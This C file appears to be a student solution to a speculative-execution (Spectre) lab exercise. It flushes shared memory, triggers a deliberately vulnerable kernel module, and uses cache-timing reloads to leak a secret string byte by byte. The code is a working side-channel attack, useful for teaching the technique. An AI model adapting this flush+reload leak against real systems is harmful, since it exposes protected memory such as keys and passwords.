/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "labspectre.h"
#include "labspectreipc.h"

static inline void mfence() {
    asm volatile("mfence");
}

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * reload_and_time
 * Measures access time to find the secret byte
 *
 * Arguments:
 *  - shared_memory: A pointer to the shared memory region
 *  - secret_value: The value of the secret byte determined by cache timing
 */
static short reload_and_time(char *shared_memory, int i) {
    uint64_t min_time = (uint64_t)-1;
    short leaked_value = 1000;
    void *probe_addr = &shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
    uint64_t access_time = time_access(probe_addr);
    if (access_time < 100) {
        leaked_value = (char)i;
    }
    //printf("%c %d\n", leaked_value, leaked_value);
    return leaked_value;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;
    char old_leaked_byte = -1;
    char oldest_leaked_byte = -1;
    printf("Launching attacker\n");
    srand(time(NULL));
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        short leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
	
	// Flush the shared memory from the cache
        int i = rand()%256;
        void *flush_addr = &shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
        clflush(flush_addr);
        mfence();

        // Call the victim code with the current offset
        call_kernel_part1(kernel_fd, shared_memory, current_offset);

        // Reload and time the shared memory to determine the leaked byte
        leaked_byte = reload_and_time(shared_memory, i);
        if(leaked_byte== 1000){current_offset--; continue;}
	leaked_str[current_offset] = leaked_byte;
        if(leaked_byte != old_leaked_byte || leaked_byte != oldest_leaked_byte) current_offset--;

        else {old_leaked_byte = -1;
oldest_leaked_byte = -1;
if (leaked_byte == '\x00') {
            break;
        }}
oldest_leaked_byte = old_leaked_byte;
old_leaked_byte = leaked_byte;
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
